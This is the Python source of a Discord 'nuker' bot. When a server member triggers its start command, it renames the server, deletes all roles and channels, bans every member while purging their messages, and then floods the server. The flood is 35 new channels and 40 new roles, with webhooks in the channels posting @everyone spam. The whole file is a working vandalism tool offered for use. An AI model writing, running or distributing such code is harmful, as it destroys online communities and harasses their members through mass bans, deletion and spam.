from discord import Intents
from discord.ext import commands
import discord
from asyncio import create_task 
from pathlib import Path
import configparser
import time
import colorama
from colorama import Fore
import os

config = configparser.ConfigParser()

colorama.init(autoreset=True)

def clear():
    if os.name=='nt':
        os.system('cls')
    else:
        os.system('clear')




ptfc = 'cfg.ini'
pti = 'icon.PNG'
cfg = Path(ptfc)
ic = Path(pti)

if ic.is_file():
    f = open('icon.PNG', 'rb')
    icona = f.read()
else:
    print(f'{Fore.RED}[ERROR]' + '\033[39m' + 'Icon not founded')
    time.sleep(1)
    print(f'{Fore.YELLOW}[Icon Check System]' + '\033[39m' + 'Please add icon to bot folder and rename it to icon.PNG')
    input(f'{Fore.YELLOW}[Icon Check System]' + '\033[39m' + 'Press Enter to close program...')
    quit()

if cfg.is_file():
    print(f'{Fore.YELLOW}[Config System]' + '\033[39m' + ' Config founded!')
    config.read('cfg.ini')
    print(f'{Fore.CYAN}[BOT]' + '\033[39m' + 'Starting...')
else:
    print(f'{Fore.RED}[ERROR]' + '\033[39m' + 'Config not found! Creating new config...')
    config['BOT_CFG'] = {'prefix': '!',
                         'token': 'bot token here',
                         'spamtext': '@everyone @here \nImagine get nuked by Five bot \nhttps://github.com/glitch65/Discord-Five-nuker-bot \nXD',
                         'ac_name': 'five nuker on top',
                         'ac_type': '1',
                         'silent_mode': '0',
                         'channels and roles name': 'nuked by five nuker',
                         'webhooks name': 'five nuker',
                         'server name':'nuked by five nuker',
                         'ban reason': 'XDDDD' }
    with open('cfg.ini', 'w') as cfg_file:
            config.write(cfg_file)
    print(f'{Fore.YELLOW}[Config System]' + '\033[39m' + 'Done!')
    print(f'{Fore.YELLOW}[Config System]' + '\033[39m' + 'Edit config file in youre folder and try again')
    input('Press Enter to close program...')
    exit()

clear()

prefix = config['BOT_CFG']['prefix'] 
token = config['BOT_CFG']['token'] 
spamtext = config['BOT_CFG']['spamtext'] 
ac_name = config['BOT_CFG']['ac_name'] 
ac_type = config['BOT_CFG']['ac_type'] 
silent_mode = config['BOT_CFG']['silent_mode'] 
chnrln = config['BOT_CFG']['channels and roles name']
wbn = config['BOT_CFG']['webhooks name']
srvn = config['BOT_CFG']['server name']
br = config['BOT_CFG']['ban reason']




intents = Intents.default()
intents.members = True
client = commands.Bot(command_prefix=prefix, help_command=None, intents=intents.all())








def login():
    try: client.run(token)
    except: print(f'{Fore.RED}[ERROR]' + '\033[39m' + 'Invalid token please change token and try again.')
    input('Press Enter to exit...')
    quit()

async def rmm():
    clear()
    mm()
    print(f'{Fore.CYAN}[BOT]' + '\033[39m' + 'Started')
    print(f'{Fore.GREEN}Logged in as {client.user}!')

@client.event
async def on_ready():
    if ac_type == 1 and silent_mode == 0:
        await client.change_presence(activity=discord.Game(name=ac_name))
    elif ac_type == 2 and silent_mode == 0:
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=ac_name))
    elif ac_type == 3 and silent_mode == 0:
        await client.change_presence(activity=discord.Streaming(name=ac_name, url='https://www.twitch.tv/discord'))
    elif ac_type == 4 and silent_mode == 0:
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=ac_name))
    elif silent_mode == 1:
        await client.change_presence(status=discord.Status.offline)
    rmm()

async def killobject(obj):
    try: await obj.delete()
    except: pass

async def sendch(ctx,channel: discord.TextChannel,count):
    for _ in range(count):
        try: await channel.send(spamtext)
        except: pass

async def createchannel(ctx,name):
    try:
        chan = await ctx.guild.create_text_channel(name=name)
        wb = await chan.create_webhook(name=wbn,avatar=icona)
        create_task(sendch(ctx,wb,60))
    except: pass

async def createrole(ctx):
    try: await ctx.guild.create_role(name=chnrln)
    except: pass


@client.command()
async def start(ctx):
    await ctx.message.delete()
    await ctx.guild.edit(name=srvn, icon=icona)
    for rl in ctx.guild.roles:
        create_task(killobject(obj=rl))
    for channel in ctx.guild.channels:
        create_task(killobject(obj=channel))
    create_task(bananaa(ctx=ctx))
    for _ in range(40):
        create_task(createrole(ctx))
    for _ in range(35):    
        create_task(createchannel(ctx,name=chnrln))



async def bananaa(ctx):
    for member in list(ctx.guild.members):
      try:
        await member.ban(reason=br, delete_message_days=7)
      except: pass
 

def mm():
    print(f'{Fore.MAGENTA}' + '''

  █████▒ ██▓ ██▒   █▓▓█████     ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
▓██   ▒ ▓██▒▓██░   █▒▓█   ▀     ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▒████ ░ ▒██▒ ▓██  █▒░▒███      ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
░▓█▒  ░ ░██░  ▒██ █░░▒▓█  ▄    ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
░▒█░    ░██░   ▒▀█░  ░▒████▒   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
 ▒ ░    ░▓     ░ ▐░  ░░ ▒░ ░   ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
 ░       ▒ ░   ░ ░░   ░ ░  ░   ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
 ░ ░     ▒ ░     ░░     ░         ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
         ░        ░     ░  ░            ░    ░     ░  ░      ░  ░   ░     
                 ░                                                        


''')

mm()

input('Welcome to Five Nuker press enter to start nuker...')
login()



